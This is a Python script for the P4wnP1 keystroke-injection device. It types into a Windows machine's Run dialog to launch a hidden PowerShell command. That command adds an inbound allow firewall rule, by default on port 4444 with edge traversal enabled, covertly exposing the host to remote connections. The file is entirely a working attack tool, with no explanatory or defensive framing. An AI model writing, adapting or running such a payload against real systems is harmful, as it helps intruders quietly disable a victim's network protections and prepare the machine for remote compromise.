#!/usr/bin/env python3
import os, sys, time
P4WN_HOME=os.getenv("P4WN_HOME","/opt/p4wnp1"); sys.path.insert(0, os.path.join(P4WN_HOME,"tools"))
from hid_type import win_r, type_string

PORT  = int(os.getenv("P4WN_FW_PORT","4444"))
PROTO = os.getenv("P4WN_FW_PROTO","TCP").upper()
NAME  = os.getenv("P4WN_FW_NAME","P4wnP1 Port")

def main():
    win_r(); time.sleep(0.4); type_string("powershell\n"); time.sleep(0.8)
    ps = (
      f"New-NetFirewallRule -DisplayName '{NAME}' -Direction Inbound -Action Allow "
      f"-Protocol {PROTO} -LocalPort {PORT} -Profile Any -EdgeTraversalPolicy Allow;"
    )
    type_string(f"powershell -nop -w hidden -c \"{ps.replace('\"','\"\"')}\"\n")
    print("[*] Firewall rule added (inbound allow).")
    return 0

if __name__=='__main__': sys.exit(main())

